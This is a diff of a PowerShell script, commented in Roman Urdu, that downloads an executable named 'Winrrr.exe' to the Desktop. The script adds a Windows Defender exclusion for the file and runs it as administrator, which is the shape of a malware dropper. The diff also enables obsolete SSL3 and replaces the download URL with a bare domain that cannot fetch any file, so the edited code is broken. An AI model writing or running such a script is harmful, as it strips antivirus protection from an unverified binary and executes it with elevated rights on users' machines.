@@ -2,21 +2,23 @@
 $desktopPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Desktop"), "Winrrr.exe")
 
 # 2. GitHub Raw Application Download URL
-$url = "https://github.com/afnan-altaf/winrrr/raw/refs/heads/main/Winrrr.exe"
+$url = "https://githubusercontent.com"
 
 try {
     Write-Host "[INFO] File download ho rahi hai..." -ForegroundColor Cyan
     
-    # Secure connection protocol force karna
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    # [FIX] Decryption Error ko hal karne ke liye system ke saare TLS/SSL channels unblock karna
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13 -bor [Net.SecurityProtocolType]::Ssl3
     
-    # File download karna
-    Invoke-WebRequest -Uri $url -OutFile $desktopPath -UseBasicParsing
+    # Live cache clear ke sath pure binary request pull karna
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $webClient.DownloadFile($url, $desktopPath)
     
-    # 3. Validation: Check karein ke download hone wali file proper EXE hai ya nahi
+    # 3. Validation Check (MZ Header Verification)
     $fileContent = Get-Content -Path $desktopPath -TotalCount 1 -Encoding Ascii
     if ($fileContent -notmatch "^MZ") {
-        throw "Downloaded file valid Windows application (.EXE) nahi hai! URL ghalat hai ya repository private hai."
+        throw "Downloaded file valid Windows application (.EXE) nahi hai! Check karein ke repository public hai ya nahi."
     }
     
     Write-Host "[SUCCESS] Valid Executable File Desktop par download ho gayi hai." -ForegroundColor Green
@@ -25,10 +27,9 @@ try {
     Write-Host "[INFO] Windows Defender mein exclusion add ho raha hai..." -ForegroundColor Cyan
     Add-MpPreference -ExclusionPath $desktopPath
     
-    # 5. Application ko Run as Administrator karwana (Windows PowerShell version)
+    # 5. Application Core Engine Execution Setup
     Write-Host "[INFO] Application chalayi ja rahi hai..." -ForegroundColor Cyan
     
-    # Standard Windows environment execution method
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $desktopPath
     $psi.Verb = "runas"
@@ -40,6 +41,6 @@ try {
 catch {
     Write-Host "[ERROR] Kuch masla aya hai: $_" -ForegroundColor Red
     
-    # Corrupted file ko delete karna
+    # Ghalat download ko remove karna
     if (Test-Path $desktopPath) { Remove-Item $desktopPath -Force }
 }
